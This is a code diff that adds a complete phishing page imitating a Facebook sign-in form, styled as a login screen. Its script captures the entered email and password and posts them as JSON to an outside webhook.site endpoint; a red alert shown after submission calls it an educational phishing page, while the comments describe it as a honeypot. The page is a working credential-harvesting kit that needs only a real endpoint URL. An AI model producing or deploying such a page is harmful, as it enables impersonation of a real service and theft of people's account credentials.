@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Facebook Login</title>
+    <style>
+        body {
+            font-family: Calibri, sans-serif;
+            background-color: #f1f1f1;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background-color: #4285F4;
+            padding: 15px;
+            text-align: center;
+        }
+
+        header h1 {
+            color: white;
+            font-size: 24px;
+        }
+
+        .container {
+            max-width: 360px;
+            margin: 80px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .input-field {
+            width: 90%;
+            padding: 5px;
+            margin: 10px;
+            border: 5px solid #a3b18a;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .btn-submit {
+            background-color: #4285F4;
+            color: white;
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .btn-submit:hover {
+            background-color: #357AE8;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: #4285F4;
+            text-decoration: none;
+        }
+
+        .fake-alert {
+            margin-top: 40px;
+            padding: 20px;
+            background-color: #f44336;
+            color: white;
+            text-align: center;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Sign in - Facebook</h1>
+</header>
+
+<div class="container">
+    <form action="#" method="POST" id="loginForm">
+        <input type="email" class="input-field" name="email" placeholder="Email or phone" required>
+        <input type="password" class="input-field" name="password" placeholder="Enter your password" required>
+
+        <!-- Fake Captcha to lure bots -->
+        <input type="text" class="input-field" name="honeypot" placeholder="Do not fill this out" style="display:none;">
+
+        <button type="submit" class="btn-submit">Next</button>
+    </form>
+
+    <div id="fakeAlert" class="fake-alert">"Oh, great! your credentials are gone - how absolutely wonderful!"
+    This is a Phishing Page created for educational purpose.
+    </div>
+</div>
+
+<div class="footer">
+    <p>By signing in, you agree to our <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>.</p>
+</div>
+
+<script>
+    // Capture the form submission to prevent real login attempts and log the interaction
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent actual submission
+
+        // Show the fake alert to simulate bot detection
+        document.getElementById('fakeAlert').style.display = 'block';
+
+        // You can log the form data (email, password, honeypot) to a logging service (this is a honeypot after all).
+        const formData = new FormData(event.target);
+        const data = {};
+        formData.forEach((value, key) => {
+            data[key] = value;
+        });
+
+        // Example logging to an external service (replace with your own logging service URL)
+        fetch('https://webhook.site/your-endpoint', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Logged successfully:', data);
+        })
+        .catch(error => {
+            console.error('Error logging data:', error);
+        });
+
+        // Reset the form after logging data
+        event.target.reset();
+    });
+</script>
+
+</body>
+</html>
